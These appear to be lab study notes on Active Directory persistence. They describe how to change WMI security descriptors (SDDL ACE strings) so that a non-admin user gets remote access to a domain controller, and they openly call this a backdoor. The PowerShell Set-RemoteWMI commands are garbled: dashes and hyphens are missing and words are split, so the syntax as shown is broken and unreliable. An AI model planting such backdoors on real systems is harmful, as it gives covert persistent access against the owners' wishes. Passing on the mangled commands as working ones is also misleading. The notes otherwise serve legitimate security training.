- It is possible to modify Security Descriptors (security information like Owner, primary group, DACL and SACL) of multiple remote access methods (securable objects) to allow access to non admin users.
- Administrative privileges are required for this.
- It, of course, works as a very useful and impactful backdoor mechanism.
- Security Descriptor Definition Language defines the format which is used to describe a security descriptor. SDDL uses ACE strings for DACL and SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid`
- ACE for built in administrators for WMI namespaces `A;CI;CCDCLCSWRPWPRCWD;;;SID`

| ace_type | ace_flags | rights | object_guid | inherit_object_guid | account_sid |
| -- | -- | -- | -- | --| -- |
| A; | CI; | CCDCLCSWRPWPRCWD; | ; | ; | SID | 


Example: Modify permission of all namespaces Services and applications > WMI Control > Root > Security > permission  

```powershell
Get-Wmiobject -Class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local
``` 


# ACLs can be modified to allow non admin users access to securable objects.

On local machine for student1:
```powershell
Set RemoteWMI UserName student1 Verbose
```

# On remote machine for student1 without explicit credentials:
```powershell
RemoteWMI UserName student1 ComputerName dcorp dc namespace 'root cimv2' Verbose
```


# On remote machine with explicit credentials. Only root cimv2 and nested namespaces:
```powershell
Set RemoteWMI UserName student1 ComputerName dcorp dc Credential A dministrator namespace 'root cimv2' Verbose
```

# On remote machine remove permissions:
```powershell
Set RemoteWMI UserName student1 ComputerName dcorp dc namespace 'root cimv2' Remove Verbose
```

